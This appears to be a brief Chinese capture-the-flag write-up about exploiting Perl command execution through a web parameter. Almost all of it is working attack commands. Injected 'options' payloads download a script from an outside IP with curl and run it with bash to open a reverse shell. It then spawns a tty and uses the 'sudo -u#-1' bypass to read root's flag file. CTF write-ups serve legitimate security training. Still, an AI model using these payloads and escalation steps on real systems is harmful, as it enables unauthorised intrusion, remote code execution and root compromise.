perl命令执行

```
?options=-r+$x%3d"curl 47.112.16.34 -o /tmp/aaa",system$x%23+2>./tmp/mote.thtml+<
&tpl=mote

?options=-r+$x%3d"bash /tmp/aaa",system$x%23+2>./tmp/mote.thtml+<
&tpl=mote		同时VPS监听
```

反弹到的shell里面执行`script /dev/null`，构建一个tty（以便ssh连接）

在服务器的`/root/web1`下方`flag.txt`文件

![](https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200208160133.png)

sudo提权：`sudo -u#-1 cat /root/flag`